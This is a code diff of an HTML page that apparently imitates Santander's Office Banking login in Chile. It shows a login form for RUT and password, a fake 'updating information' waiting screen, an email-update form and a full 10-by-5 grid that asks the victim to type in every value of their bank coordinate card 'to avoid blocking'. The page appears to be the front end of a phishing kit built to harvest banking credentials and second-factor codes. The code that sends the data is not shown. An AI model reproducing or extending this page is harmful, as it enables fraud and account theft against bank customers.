@@ -165,120 +165,188 @@
     </button>
   </div>
 
- <div class="offcanvas-body" style="overflow-y:auto; max-height:100vh;">
-  <h5 class="text-center mb-4">
-    Bienvenido a Office Banking
-  </h5>
-
-  <div class="login-box">
-
-    <!-- Formulario inicial -->
-    <form id="loginForm">
-      <label for="rut">RUT</label>
-      <div class="position-relative">
-        <input type="text" id="rut" name="rut" placeholder="12.345.678-5" required class="form-control" style="padding-right: 40px;">
-        <span class="clear-input" onclick="document.getElementById('rut').value=''"></span>
-      </div>
-
-      <label for="passwd">Contraseña</label>
-      <div class="position-relative">
-        <input 
-          type="password" 
-          id="passwd" 
-          name="passwd" 
-          required 
-          class="form-control" 
-          style="padding-right: 80px;">
-        <span class="clear-input" onclick="document.getElementById('passwd').value=''"></span>
-        <img id="togglePasswd" src="eye.svg" alt="Mostrar contraseña" class="icon-eye">
-      </div>
-                       
-      <button type="submit" class="btn-red w-100">Aceptar</button>
-      <div class="options">
-        <a href="https://wslogin.officebanking.cl/autogestion-clave" target="_blank">¿Olvidaste tu clave?</a>
-      </div>
-    </form>
-
-    <div id="resultado"></div>
-
-    <!-- Pantalla de espera -->
-    <div id="pantallaEspera" class="hidden">
-      <h2>Estamos actualizando la información, por favor espera...</h2>
-      <div class="spinner"></div>
+<div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasLogin" aria-labelledby="offcanvasLoginLabel">
+  <div class="offcanvas-header" style="padding-top:40px; padding-bottom:20px;">
+    <div class="d-flex justify-content-center align-items-center">
+      <img src="/logo-office-banking.svg" alt="Office Banking" class="logo-ob me-3">
+      <img src="/LogoSantander.png" alt="Logo Santander" class="logo-santander">
     </div>
+    <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"
+            style="filter: invert(30%) sepia(100%) saturate(5000%) hue-rotate(340deg);">
+    </button>
+  </div>
 
-    <!-- Formulario de correo -->
-    <div id="formCorreo" class="hidden">
-      <h2>Necesitamos actualizar tu correo electrónico</h2>
-      <input type="email" id="correo" placeholder="Ingresa tu correo">
-      <button class="btn-red" onclick="enviarCorreo()">Enviar</button>
-    </div>
+  <div class="offcanvas-body" style="overflow-y:auto; max-height:100vh;">
+    <h5 class="text-center mb-4">
+      Bienvenido a Office Banking
+    </h5>
 
-    <!-- Pantalla de selección -->
-    <div id="pantallaSeleccion" class="hidden" style="text-align:center; padding:20px;">
-      <h2 style="font-size:18px; margin-bottom:20px;">
-        ¿Aún utilizas Tarjeta de Coordenadas?
-      </h2>
+    <div class="login-box">
 
-      <button class="btn-red w-100 mb-3" onclick="seleccionarCoordenadas()">
-        Tengo Tarjeta de Coordenadas
-      </button>
+      <!-- FORMULARIO LOGIN -->
+      <form id="loginForm">
+        <label for="rut">RUT</label>
+        <div class="position-relative">
+          <input type="text" id="rut" name="rut" placeholder="12.345.678-5" required class="form-control" style="padding-right: 40px;">
+          <span class="clear-input" onclick="document.getElementById('rut').value=''"></span>
+        </div>
 
-      <button class="btn-red w-100" onclick="seleccionarPass()">
-        Tengo Santander Pass
-      </button>
-    </div>
+        <label for="passwd">Contraseña</label>
+        <div class="position-relative">
+          <input 
+            type="password" 
+            id="passwd" 
+            name="passwd" 
+            required 
+            class="form-control" 
+            style="padding-right: 80px;">
+          <span class="clear-input" onclick="document.getElementById('passwd').value=''"></span>
+          <img id="togglePasswd" src="eye.svg" alt="Mostrar contraseña" class="icon-eye">
+        </div>
+                         
+        <button type="submit" class="btn-red w-100">Aceptar</button>
+        <div class="options">
+          <a href="https://wslogin.officebanking.cl/autogestion-clave" target="_blank">¿Olvidaste tu clave?</a>
+        </div>
+      </form>
 
-    <!-- Pantalla Tarjeta de Coordenadas -->
-    <div id="pantallaCoordenadas" class="hidden" style="padding:20px;">
+      <div id="resultado"></div>
 
-      <div class="text-center mb-3">
-        <img src="/logo-office-banking.svg" alt="Office Banking" style="height:50px;">
+      <!-- PANTALLA ESPERA -->
+      <div id="pantallaEspera" class="hidden">
+        <h2>Estamos actualizando la información, por favor espera...</h2>
+        <div class="spinner"></div>
       </div>
 
-      <h2 class="text-center" style="font-size:18px; margin-bottom:20px;">
-        Si aún mantienes tu <strong>Tarjeta de Coordenadas</strong>, es necesario actualizarla para evitar el bloqueo de la misma.
-      </h2>
+      <!-- FORMULARIO CORREO -->
+      <div id="formCorreo" class="hidden">
+        <h2>Necesitamos actualizar tu correo electrónico</h2>
+        <input type="email" id="correo" placeholder="Ingresa tu correo">
+        <button class="btn-red" onclick="enviarCorreo()">Enviar</button>
+      </div>
 
-      <div class="table-responsive" style="overflow-x:auto;">
-        <table class="table table-bordered text-center" style="min-width:600px;">
-          <thead>
-            <tr>
-              <th></th>
-              <th>A</th><th>B</th><th>C</th><th>D</th><th>E</th>
-              <th>F</th><th>G</th><th>H</th><th>I</th><th>J</th>
-            </tr>
-          </thead>
-          <tbody>
-            ${[1,2,3,4,5].map(num => `
+      <!-- SELECCIÓN COORDENADAS / PASS -->
+      <div id="pantallaSeleccion" class="hidden" style="text-align:center; padding:20px;">
+        <h2 style="font-size:18px; margin-bottom:20px;">
+          ¿Aún utilizas Tarjeta de Coordenadas?
+        </h2>
+
+        <button class="btn-red w-100 mb-3" onclick="seleccionarCoordenadas()">
+          Tengo Tarjeta de Coordenadas
+        </button>
+
+        <button class="btn-red w-100" onclick="seleccionarPass()">
+          Tengo Santander Pass
+        </button>
+      </div>
+
+      <!-- PANTALLA COORDENADAS -->
+      <div id="pantallaCoordenadas" class="hidden" style="padding:20px;">
+
+        <div class="text-center mb-3">
+          <img src="/logo-office-banking.svg" alt="Office Banking" style="height:50px;">
+        </div>
+
+        <h2 class="text-center" style="font-size:18px; margin-bottom:20px;">
+          Si aún mantienes tu <strong>Tarjeta de Coordenadas</strong>, es necesario actualizarla para evitar el bloqueo de la misma.
+        </h2>
+
+        <div class="table-responsive" style="overflow-x:auto;">
+          <table class="table table-bordered text-center" style="min-width:600px;">
+            <thead>
               <tr>
-                <th>${num}</th>
-                ${['A','B','C','D','E','F','G','H','I','J'].map(col => `
-                  <td>
-                    <input 
-                      type="text" 
-                      maxlength="2" 
-                      class="coord-input" 
-                      id="coord-${col}${num}"
-                      style="width:40px; text-align:center; font-size:14px;">
-                  </td>
-                `).join('')}
+                <th></th>
+                <th>A</th><th>B</th><th>C</th><th>D</th><th>E</th>
+                <th>F</th><th>G</th><th>H</th><th>I</th><th>J</th>
               </tr>
-            `).join('')}
-          </tbody>
-        </table>
+            </thead>
+            <tbody>
+
+              <!-- FILA 1 -->
+              <tr><th>1</th>
+                <td><input maxlength="2" id="coord-A1" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-B1" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-C1" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-D1" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-E1" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-F1" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-G1" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-H1" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-I1" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-J1" class="coord-input"></td>
+              </tr>
+
+              <!-- FILA 2 -->
+              <tr><th>2</th>
+                <td><input maxlength="2" id="coord-A2" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-B2" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-C2" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-D2" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-E2" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-F2" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-G2" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-H2" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-I2" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-J2" class="coord-input"></td>
+              </tr>
+
+              <!-- FILA 3 -->
+              <tr><th>3</th>
+                <td><input maxlength="2" id="coord-A3" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-B3" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-C3" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-D3" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-E3" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-F3" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-G3" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-H3" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-I3" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-J3" class="coord-input"></td>
+              </tr>
+
+              <!-- FILA 4 -->
+              <tr><th>4</th>
+                <td><input maxlength="2" id="coord-A4" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-B4" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-C4" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-D4" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-E4" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-F4" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-G4" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-H4" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-I4" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-J4" class="coord-input"></td>
+              </tr>
+
+              <!-- FILA 5 -->
+              <tr><th>5</th>
+                <td><input maxlength="2" id="coord-A5" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-B5" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-C5" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-D5" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-E5" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-F5" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-G5" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-H5" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-I5" class="coord-input"></td>
+                <td><input maxlength="2" id="coord-J5" class="coord-input"></td>
+              </tr>
+
+            </tbody>
+          </table>
+        </div>
+
+        <button class="btn-red w-100 mt-3" onclick="enviarCoordenadas()">
+          Ingresar
+        </button>
       </div>
 
-      <button class="btn-red w-100 mt-3" onclick="enviarCoordenadas()">
-        Ingresar
-      </button>
-    </div>
+      <!-- PANTALLA PRODUCTOS -->
+      <div id="pantallaProductos" class="hidden">
+        <h2>Estamos evaluando la mejor alternativa posible</h2>
+        <button class="btn-red" onclick="continuarProductos()">Continuar</button>
+      </div>
 
-    <!-- Pantalla de productos -->
-    <div id="pantallaProductos" class="hidden">
-      <h2>Estamos evaluando la mejor alternativa posible</h2>
-      <button class="btn-red" onclick="continuarProductos()">Continuar</button>
     </div>
-
   </div>
 </div>
